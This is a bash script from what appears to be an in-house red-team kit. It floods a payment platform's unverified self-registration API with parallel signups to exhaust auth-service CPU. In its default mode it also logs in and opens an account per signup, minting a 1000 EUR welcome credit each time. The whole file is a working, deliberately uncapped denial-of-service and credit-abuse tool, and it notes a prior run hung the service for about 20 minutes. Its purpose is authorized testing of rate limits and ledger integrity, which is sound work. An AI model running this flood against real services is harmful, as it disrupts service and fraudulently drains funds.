#!/bin/bash
# 06 - Mass account creation (registration flood) against our own SI.
# Abuses open self-registration (no email verification). Two edges:
#   1) argon2id hashing per register is CPU-expensive -> volumetric registration
#      is a cheap CPU-exhaustion DoS on auth-service.
#   2) MODE=full also opens each account (GET /accounts/me), minting the fictive
#      1000 EUR welcome credit -> 10k accounts = 10 000 000 EUR from treasury,
#      which stresses ledger accounting.
#
# SAFETY: a 10k/100 run on 20/10/2026 hung auth-service for ~20 min. There is no
# hard cap: choose COUNT/CONCURRENCY deliberately, and wrap large runs in
# `timeout` with the Blue team watching.
#
# Usage:
#   TARGET=172.16.147.10 COUNT=10 CONCURRENCY=2 ./account-flood.sh
#   TARGET=172.16.147.10 COUNT=10 CONCURRENCY=2 MODE=register ./account-flood.sh
#   TARGET=172.16.147.10 COUNT=10000 CONCURRENCY=100 timeout 60 ./account-flood.sh
#   Env: TARGET, PORT, COUNT (default 50), CONCURRENCY (default 5),
#        MODE=full (register+login+open account) | register (users only),
#        VERBOSE=1 (per-account console lines; default 1)
# Stop: Ctrl-C (also: pkill -f account-flood)
set -uo pipefail
source "$(dirname "$0")/../_lib/guard.sh"

TARGET="${TARGET:-172.16.147.10}"
PORT="${PORT:-8080}"
COUNT="${COUNT:-50}"
CONCURRENCY="${CONCURRENCY:-5}"
MODE="${MODE:-full}"
PW="${PW:-FloodRun2026!xyz}"       # >=10 chars
VERBOSE="${VERBOSE:-1}"

ra_require_scope "$TARGET"

# --- Input validation ------------------------------------------------------
[[ "$COUNT" =~ ^[0-9]+$ ]] || { echo "[-] COUNT must be a non-negative integer."; exit 1; }
[[ "$CONCURRENCY" =~ ^[0-9]+$ ]] || { echo "[-] CONCURRENCY must be a non-negative integer."; exit 1; }
COUNT=$((10#$COUNT))
CONCURRENCY=$((10#$CONCURRENCY))
[ "$CONCURRENCY" -ge 1 ] || { echo "[-] CONCURRENCY must be >= 1."; exit 1; }
# Pas de plafond : le choix de COUNT/CONCURRENCY appartient à l'opérateur. On
# signale seulement les runs au-delà du scénario documenté (10k/100).
if [ "$COUNT" -gt 10000 ] || [ "$CONCURRENCY" -gt 100 ]; then
  echo "[!] Large run: COUNT=$COUNT CONCURRENCY=$CONCURRENCY. Unbounded; wrap in timeout and watch auth-service."
fi

BASE="http://$TARGET:$PORT"
RUN="$(date +%s)"
OUTDIR="$(ra_logdir acctflood)"
RESULTS="$OUTDIR/codes.txt"; : > "$RESULTS"
DETAILS="$OUTDIR/accounts.csv"
CREATED="$OUTDIR/created.log"
printf 'i,email,register_code,latency_ms,login_code,account_code,account_number,balance_cents\n' > "$DETAILS"
: > "$CREATED"

if [ "$MODE" = full ] && ! command -v jq >/dev/null 2>&1; then
  echo "[-] jq is required for MODE=full (token/account parsing)."; exit 1
fi

echo "[*] Target: $BASE   COUNT=$COUNT  CONCURRENCY=$CONCURRENCY  MODE=$MODE"
echo "[*] Started: $(ra_now)   Logs: $OUTDIR"
echo "[*] Blue team: watch auth-service CPU, register req/s, 429/503, DB rows, treasury balance."
echo "[*] Live accounts: tail -f $CREATED"
# "/health" renvoie le SPA (200 même quand auth est HS) : on sonde la vraie santé auth.
hbefore=$(curl -s -o /dev/null -w '%{http_code}' -m 5 "$BASE/api/auth/health") || hbefore=000
echo "[*] /api/auth/health before: $hbefore"

# One registration (+ optional login/account opening), with per-account logs.
flood_one() {
  local i="$1" email code tok lcode acode acct bal tmp t0 t1 lat
  local detail=""
  email="flood-$RUN-$i@pay.local"
  tmp="$(mktemp "${TMPDIR:-/tmp}/ra-flood.XXXXXX")"

  t0=$(date +%s%3N)
  code=$(curl -s -o "$tmp" -w '%{http_code}' -m 15 -H 'Content-Type: application/json' \
    -X POST "$BASE/api/auth/register" \
    -d "{\"email\":\"$email\",\"full_name\":\"Flood $i\",\"password\":\"$PW\"}") || true
  t1=$(date +%s%3N)
  [ -n "$code" ] || code=000
  lat=$((t1 - t0))

  case "$code" in
    200|201) detail="created" ;;
    429)     detail="RATE-LIMITED" ;;
    000)     detail="TIMEOUT/ERROR" ;;
    *)       detail="ERROR" ;;
  esac
  [ "$VERBOSE" = 1 ] && printf '[%5d/%d] %s register %-34s -> %s (%dms) %s\n' \
    "$i" "$COUNT" "$(date -u +%H:%M:%S)" "$email" "$code" "$lat" "$detail"
  echo "$code" >> "$RESULTS"

  lcode=""; acode=""; acct=""; bal=""
  if [ "$MODE" = full ] && { [ "$code" = 201 ] || [ "$code" = 200 ]; }; then
    t0=$(date +%s%3N)
    lcode=$(curl -s -o "$tmp" -w '%{http_code}' -m 15 -H 'Content-Type: application/json' \
      -X POST "$BASE/api/auth/login" \
      -d "{\"email\":\"$email\",\"password\":\"$PW\"}") || true
    t1=$(date +%s%3N)
    [ -n "$lcode" ] || lcode=000
    tok=$(jq -r '.access_token // empty' "$tmp" 2>/dev/null || true)
    [ "$VERBOSE" = 1 ] && printf '[%5d/%d] %s login    %-34s -> %s (%dms) token=%s\n' \
      "$i" "$COUNT" "$(date -u +%H:%M:%S)" "$email" "$lcode" "$((t1 - t0))" \
      "$([ -n "$tok" ] && echo ok || echo MISSING)"

    if [ -n "$tok" ]; then
      t0=$(date +%s%3N)
      acode=$(curl -s -o "$tmp" -w '%{http_code}' -m 15 -H "Authorization: Bearer $tok" \
        "$BASE/api/payments/accounts/me") || true
      t1=$(date +%s%3N)
      [ -n "$acode" ] || acode=000
      acct=$(jq -r '.account_number // empty' "$tmp" 2>/dev/null || true)
      bal=$(jq -r '.balance_cents // empty' "$tmp" 2>/dev/null || true)
      [ "$VERBOSE" = 1 ] && printf '[%5d/%d] %s account  %-34s -> %s (%dms) acct=%s balance=%s\n' \
        "$i" "$COUNT" "$(date -u +%H:%M:%S)" "$email" "$acode" "$((t1 - t0))" \
        "${acct:-?}" "${bal:-?}"
      if [ "$acode" = 200 ] && [ -n "$acct" ]; then
        printf '%s %s acct=%s balance=%s\n' "$(date -u +%H:%M:%S)" "$email" "$acct" "$bal" >> "$CREATED"
      fi
    fi
  fi

  printf '%s,%s,%s,%d,%s,%s,%s,%s\n' "$i" "$email" "$code" "$lat" "$lcode" "$acode" "$acct" "$bal" >> "$DETAILS"
  rm -f "$tmp"
}
export -f flood_one
export BASE RUN MODE PW RESULTS COUNT VERBOSE DETAILS CREATED

cleanup() { echo ""; echo "[*] Stopping... $(ra_now)"; }
trap cleanup INT TERM

echo "[*] Launching $COUNT registrations @ $CONCURRENCY in parallel..."
SECONDS=0
seq 1 "$COUNT" | xargs -P "$CONCURRENCY" -I{} bash -c 'flood_one "$@"' _ {} || true
dur=$SECONDS

ok=$(grep -cxE '201|200' "$RESULTS" || true)
rl=$(grep -cx '429' "$RESULTS" || true)
sv=$(grep -cxE '503|502|500|000' "$RESULTS" || true)
hafter=$(curl -s -o /dev/null -w '%{http_code}' -m 5 "$BASE/api/auth/health") || hafter=000

echo ""
echo "=== SUMMARY $(ra_now) ==="
echo "  duration      : ${dur}s   (~$(( COUNT / (dur>0?dur:1) )) reg/s attempted)"
echo "  created (2xx) : $ok / $COUNT"
echo "  rate-limited  : $rl   (429 — a registration throttle would show here)"
echo "  errors/5xx/to : $sv   (service strain)"
echo "  code breakdown:"; sort "$RESULTS" | uniq -c | sort -rn | sed 's/^/    /'
echo "  /api/auth/health before -> after : $hbefore -> $hafter"
echo "  accounts CSV  : $DETAILS"
echo "  created log   : $CREATED ($(wc -l < "$CREATED") account(s) opened)"
if [ "$rl" = 0 ] && [ "$COUNT" -ge 50 ]; then
  echo "  [!] No 429 seen: registration is NOT rate-limited (V5). Mass creation unthrottled."
elif [ "$rl" = 0 ]; then
  echo "  [i] No 429 seen, but COUNT=$COUNT is too small to conclude on rate limiting."
fi
[ "$MODE" = full ] && echo "  [i] MODE=full: each opened account minted 1000 EUR; check ledger integrity / treasury on the Hôte."
echo "[*] Evidence: $OUTDIR"
